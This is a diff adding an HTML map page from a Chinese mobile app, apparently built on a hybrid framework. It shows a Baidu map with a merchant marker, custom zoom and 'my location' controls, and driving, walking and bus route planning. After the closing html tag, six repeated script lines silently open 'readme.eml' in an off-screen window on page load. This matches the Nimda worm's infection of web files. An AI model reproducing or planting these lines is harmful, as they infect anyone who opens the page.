@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html
+	class="ui-mobile landscape min-width-240px min-width-320px min-width-480px min-width-768px min-width-1024px map_body">
+<head>
+<title></title>
+<meta charset="utf-8">
+<meta name="viewport"
+	content="width=device-width, initial-scale=1, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
+<link rel="stylesheet" href="../css/common.css">
+<script src="../js/zy_anim.js"></script>
+<script src="../js/zy_control.js"></script>
+<script src="../js/zy_tmpl.js"></script>
+<script src="../js/zyflip.js"></script>
+<script src="../js/jquery.js"></script>
+<script
+	src="http://dev.baidu.com/wiki/static/map/API/examples/script/convertor.js"></script>
+<script src="../js/common.js"></script>
+</head>
+<body class="body">
+
+	<!--header开始-->
+	<div id="header" class="header">
+		<div data-role="header" class="header_main">
+			<div class="title">地图</div>
+			<div
+				ontouchstart="uexWindow.evaluateScript('', '0', 'COM.UTILS.closeWindow(-1)');"
+				class="btn btn_head btn_head_l btn_head_return">返回</div>
+				<!-- 
+			<div
+				onclick="uexWindow.evaluateScript('', '0', 'COM.UTILS.openWindow(\'home\',\'../home.html\',0)')"
+				class="btn btn_head btn_head_r btn_head_home"></div>
+				 -->
+		</div>
+		<nav class="header_border_60">
+			<ul>
+				<li id="map_0" ontouchstart="COM.UTILS.navClickEvent(this);uexWindow.evaluateScript('', '0', 'addOnlyMarker()',0);"><span
+					class="checked">位置</span>
+				</li>
+				<li id="map_1" ontouchstart="COM.UTILS.navClickEvent(this);uexWindow.evaluateScript('', '0', 'toDaoHang(1)',0);"><span
+					class="unchecked">驾车</span>
+				</li>
+				<li id="map_2" ontouchstart="COM.UTILS.navClickEvent(this);uexWindow.evaluateScript('', '0', 'toDaoHang(2)',0);"><span
+					class="unchecked">步行</span>
+				</li>
+				<li id="map_3" ontouchstart="COM.UTILS.navClickEvent(this);uexWindow.evaluateScript('', '0', 'toDaoHang(3)',0);"><span
+					class="unchecked">公交</span>
+				</li>
+			</ul>
+		</nav>
+	</div>
+	<div class="head_bottom_shadow head_bottom_shadow_120" >
+		
+	</div>
+	<div class="footer_shadow"></div>
+
+	<!--header结束-->
+	<!--content开始-->
+	<div id="page_0" class="content_list map_content" tabindex="0" >
+		<div id="map_canvas"></div>
+	</div>
+	<div id="footer" data-role="footer" class=""></div>
+</body>
+<script>
+	var vdata;//用于页面间参数传递
+	var vscreen320=COM.UTILS.isWidth320();
+	$(function(){
+		$("#map_canvas").height($(window).height()-$("#header").height());
+	});
+	zy_fix("header", null, 0, function() {
+		/*请在此插入网页初始化代码*/
+		COM.DIALOG.waiting("地图加载中，请稍候……");
+		vdata = zy_parse();
+		COM.UTILS.initLocation();
+		onDeviceReady();
+		COM.UTILS.ReturnKeySet(COM.UTILS.closeWindow);
+	});
+	function goBack() {
+		COM.UTILS.closeWindow(-1);
+	}
+	
+	
+	var lon = 118.186969;//118.117986; //116.404, 39.915//118.182231;//
+	var lat = 24.483939;//24.496026;//24.4854941;//
+	var src_point="";//转换后的起点	(我的位置)
+	var src_gps = "";
+	var dest_point="";//转换后的终点（商户位置）
+	var map = null;
+	var marker = null;//目标点标注
+	var myMarker =null;//起始点标注
+	var atype = 0;//导航类型：0 驾车 1 步行 2 公交 
+	var getPosFlag=false;//是否获取当前位置：true 是 false 否
+	
+	function onDeviceReady() {
+		lon = vdata.lon?parseFloat(vdata.lon):lon;
+		lat = vdata.lat?parseFloat(vdata.lat):lat;
+		console.log("1...lon=" + lon + ",lat=" + lat);
+		var script = document.createElement("script");
+		script.src = "http://api.map.baidu.com/api?v=1.2&callback=initialize";
+		document.body.appendChild(script);
+	}
+	function initialize() {
+		var point = new BMap.Point(lon, lat);
+		BMap.Convertor.translate(point, 2, initialize_map);
+	}
+	function addMarker(){
+		map.addOverlay(marker);
+		map.addOverlay(myMarker);
+	}
+	function addOnlyMarker(){
+		atype = 0;
+		if(null != walkingLine){
+			walkingLine.hide();
+		}
+		if(null != carLine){
+			carLine.hide();
+		}
+		if(null != busLine){
+			for(var i=0;i<busLine.length;++i){
+				busLine[i].hide();
+			}
+		}
+		map.centerAndZoom(dest_point, map.getZoom() );
+	}
+	
+	function initialize_map(destpoint) {
+		dest_point = destpoint;
+		map = new BMap.Map("map_canvas"); // 创建地图实例
+		map.centerAndZoom(dest_point, 14); // 初始化地图，设置中心点坐标和地图级别
+		var desticon=new BMap.Icon("../css/images1/z_w_ta.png",
+				new BMap.Size(35,35),
+				{offset: new BMap.Size(10, 20)});
+		marker = new BMap.Marker(dest_point,{icon:desticon}); // 创建标注  
+		map.addOverlay(marker); // 将标注添加到地图中  
+
+		// 定义缩小控件类,即function
+		function ZoomInControl() {
+			// 默认停靠位置和偏移量
+			this.defaultAnchor = BMAP_ANCHOR_BOTTOM_RIGHT;
+			if(vscreen320){
+				console.log("in zoomin,vscreen320="+vscreen320?"true":"false");
+				this.defaultOffset = new BMap.Size(75, 50); //10,20
+			}else{
+				console.log("in zoomin,vscreen320="+vscreen320?"true":"false");
+				this.defaultOffset = new BMap.Size(100, 50); //10,20
+			} 
+		}
+		// 通过JavaScript的prototype属性继承于BMap.Control
+		ZoomInControl.prototype = new BMap.Control();
+		ZoomInControl.prototype.initialize = function(map) {
+			// 创建一个DOM元素
+			var div = document.createElement("div");
+			div.setAttribute("class", "zoomin");
+			// 绑定事件,点击一次缩小一级
+			div.onclick = function(e) {
+				map.setZoom(map.getZoom() - 1);
+			}
+			// 添加DOM元素到地图中
+			map.getContainer().appendChild(div);
+			// 将DOM元素返回
+			return div;
+		}
+
+		// 定义放大控件类,即function
+		function ZoomOutControl() {
+			// 默认停靠位置和偏移量
+			this.defaultAnchor = BMAP_ANCHOR_BOTTOM_RIGHT;
+			this.defaultOffset = new BMap.Size(20, 50); //10,20
+		}
+
+		// 通过JavaScript的prototype属性继承于BMap.Control
+		ZoomOutControl.prototype = new BMap.Control();
+		ZoomOutControl.prototype.initialize = function(map) {
+			// 创建一个DOM元素
+			var div = document.createElement("div");
+			div.setAttribute("class", "zoomout");
+			// 绑定事件,点击一次放大一级
+			div.onclick = function(e) {
+				map.setZoom(map.getZoom() + 1);
+			}
+			// 添加DOM元素到地图中
+			map.getContainer().appendChild(div);
+			// 将DOM元素返回
+			return div;
+		}
+		// 定义我的位置控件类,即function
+		function meWhereControl() {
+			// 默认停靠位置和偏移量
+			this.defaultAnchor = BMAP_ANCHOR_BOTTOM_LEFT ;
+			console.log("in meWhereControl,vscreen320="+vscreen320?"true":"false");
+			if(vscreen320){
+				this.defaultOffset = new BMap.Size(15, 105); //10,20
+			}else{
+				this.defaultOffset = new BMap.Size(15, 125); //10,20
+			} 
+		}
+
+		// 通过JavaScript的prototype属性继承于BMap.Control
+		meWhereControl.prototype = new BMap.Control();
+		meWhereControl.prototype.initialize = function(map) {
+			// 创建一个DOM元素
+			var div = document.createElement("div");
+			div.setAttribute("class", "zoomme");
+			// 绑定事件,点击一次放大一级
+			div.onclick = function(e) {
+				if(src_gps==""){
+					getPosFlag=true;
+					//getCurPostion(daoHang);
+					COM.UTILS.getLocation(daoHang);
+				}else{
+					makeMarkerSrc(src_point);
+				}
+			}
+			// 添加DOM元素到地图中
+			map.getContainer().appendChild(div);
+			// 将DOM元素返回
+			return div;
+		}
+		// 定义商户的位置控件类,即function
+		function shopWhereControl() {
+			// 默认停靠位置和偏移量13
+			this.defaultAnchor = BMAP_ANCHOR_BOTTOM_LEFT ;
+			this.defaultOffset = new BMap.Size(15, 50); //10,20
+		}
+
+		// 通过JavaScript的prototype属性继承于BMap.Control
+		shopWhereControl.prototype = new BMap.Control();
+		shopWhereControl.prototype.initialize = function(map) {
+			// 创建一个DOM元素
+			var div = document.createElement("div");
+			div.setAttribute("class", "zoomta");
+			// 绑定事件,点击一次放大一级
+			div.onclick = function(e) {
+				map.centerAndZoom(dest_point, map.getZoom() );
+			}
+			// 添加DOM元素到地图中
+			map.getContainer().appendChild(div);
+			// 将DOM元素返回
+			return div;
+		}
+
+		// 创建控件
+		var myZoomInCtrl = new ZoomInControl();
+		// 添加到地图当中
+		map.addControl(myZoomInCtrl);
+		// 创建控件
+		var myZoomOutCtrl = new ZoomOutControl();
+		// 添加到地图当中
+		map.addControl(myZoomOutCtrl);
+		// 创建控件添加到地图当中
+		var myMeWhereControl=new meWhereControl();	
+		map.addControl(myMeWhereControl);
+		var myShopWhereControl=new shopWhereControl();	
+		map.addControl(myShopWhereControl);
+		
+		COM.DIALOG.closewaiting();
+	}
+	function toDaoHang(home) {
+		if(atype == home)return;
+		COM.DIALOG.waiting("导航路线规划中，请稍候……");
+		atype=home;
+		//getCurPostion(daoHang);
+		if("" != src_gps){
+			daoHang(src_gps);
+		}else{
+			COM.UTILS.getLocation(daoHang);
+		}
+	}
+	function getCurPostion(daoHang) {
+		if (daoHang != null) {
+			daoHang( {
+				lon : 118.117996,
+				lat : 24.495500
+			});//{lon:117.988,lat:24.6036}
+		}
+	}
+	function daoHang(pos) {
+		if (pos == null || typeof (pos) == "undefined") {
+			COM.DIALOG.closewaiting();
+			COM.DIALOG.alert("获取当前位置失败……");
+			return;
+		}
+		src_gps = pos;
+		console.log("2...lon=" + pos.lon + ",lat=" + pos.lat);
+		var point = new BMap.Point(pos.lon, pos.lat);
+		if(getPosFlag){
+			BMap.Convertor.translate(point, 2, makeMarkerSrc);
+		}else{
+			BMap.Convertor.translate(point, 2, AfterChangeToDaohang);
+		}
+	}
+	
+	function makeMarkerSrc(pos){
+		getPosFlag=false;
+		src_point=pos;
+		if(null == myMarker){
+			var srcicon=new BMap.Icon("../css/images1/z_w_me.png",
+					new BMap.Size(35,35),
+					{offset: new BMap.Size(10, 20)});
+			myMarker = new BMap.Marker(src_point,{icon:srcicon}); // 创建标注  
+			map.addOverlay(myMarker); // 将标注添加到地图中  
+		}
+		map.centerAndZoom(src_point, map.getZoom() );
+	}
+
+	function AfterChangeToDaohang(pos) {
+		src_point = pos;
+		if (1 == atype) {
+			if(null != walkingLine){
+				walkingLine.hide();
+			}
+			if(null != busLine){
+				for(var i=0;i<busLine.length;++i){
+					busLine[i].hide();
+				}
+			}
+			driveForCar(map, src_point, dest_point);
+		} else if (2 == atype) {
+			if(null != busLine){
+				for(var i=0;i<busLine.length;++i){
+					busLine[i].hide();
+				}
+			}
+			if(null != carLine){
+				carLine.hide();
+			}
+			driveForFoot(map, src_point, dest_point);
+		} else {
+			if(null != walkingLine){
+				walkingLine.hide();
+			}
+			if(null != carLine){
+				carLine.hide();
+			}
+			driveForBus(map, src_point, dest_point);
+		}
+	}
+
+	var walkingLine = null;
+	function driveForFoot(map, startp, endp) {
+		if(null == walkingLine){
+			var footing = new BMap.WalkingRoute(map, {
+				onSearchComplete : function(results) {
+					COM.DIALOG.closewaiting();
+					if (footing.getStatus() == BMAP_STATUS_SUCCESS) {
+						if (results.getNumPlans() > 0) {
+							var path = results.getPlan(0).getRoute(0).getPath();   
+					        walkingLine = new BMap.Polyline(path,{
+					        	 strokeColor: 'red',
+					             strokeOpacity: 1,
+					             strokeWeight: 4,
+					             strokeStyle: 'dashed',
+					             enableClicking: false
+					        });   
+					        map.addOverlay(walkingLine);
+					        if(null == myMarker){
+					        	makeMarkerSrc(src_point);
+					        }
+						} else {
+							COM.DIALOG.alert("没有合适的线路能到达此处……");
+						}
+					} else {
+						COM.DIALOG.alert("没有合适的线路能到达此处……");
+					}
+				}
+			});
+			footing.search(startp, endp);
+		}else{
+			COM.DIALOG.closewaiting();	
+			walkingLine.show();
+		}
+	}
+
+	 var busLine = null;
+	function driveForBus(map, startp, endp) {
+		if(null == busLine){
+			var bussing = new BMap.TransitRoute(map, {
+				onSearchComplete : function(results) {
+					COM.DIALOG.closewaiting();
+					if (bussing.getStatus() == BMAP_STATUS_SUCCESS) {
+						if (results.getNumPlans() > 0) {
+							busLine = [];
+							var plan = results.getPlan(0);
+							for(var i=0;i<plan.getNumLines();++i){
+								var path = plan.getLine(i).getPath();  
+						        var bus = new BMap.Polyline(path,{
+						        	 strokeColor: 'green',
+						             strokeOpacity: 1,
+						             strokeWeight: 4,
+						             strokeStyle: 'dashed',
+						             enableClicking: false
+						        });   
+						        map.addOverlay(bus);
+						        busLine.push(bus);
+							}
+							
+					        if(null == myMarker){
+					        	makeMarkerSrc(src_point);
+					        }
+						} else {
+							COM.DIALOG.alert("没有合适的公交线路能到达此处……");
+						}
+					} else {
+						COM.DIALOG.alert("没有合适的公交线路能到达此处……");
+					}
+				}
+			});
+			bussing.search(startp, endp);
+		}else{
+			COM.DIALOG.closewaiting();	
+			for(var i=0;i<busLine.length;++i){
+				busLine[i].show();
+			}
+		}
+	} 
+
+	//车辆导航路径规划
+	var carLine = null;
+	function driveForCar(map, startp, endp) {
+		if(null == carLine){
+			var driving = new BMap.DrivingRoute(map, {
+				onSearchComplete : function(results) {
+					COM.DIALOG.closewaiting();
+					if (driving.getStatus() == BMAP_STATUS_SUCCESS) {
+						if (results.getNumPlans() > 0) {
+							var path = results.getPlan(0).getRoute(0).getPath();  
+							carLine = new BMap.Polyline(path,{
+					        	 strokeColor: 'black',
+					             strokeOpacity: 1,
+					             strokeWeight: 4,
+					             strokeStyle: 'dashed',
+					             enableClicking: false
+					        });   
+					        map.addOverlay(carLine);
+					        if(null == myMarker){
+					        	makeMarkerSrc(src_point);
+					        }
+						} else {
+							COM.DIALOG.alert("没有合适的线路能到达此处……");
+						}
+					} else {
+						COM.DIALOG.alert("没有合适的线路能到达此处……");
+					}
+				}
+			});
+			driving.search(startp, endp);
+		}else{
+			COM.DIALOG.closewaiting();		
+			carLine.show();
+		}
+	}
+</script>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
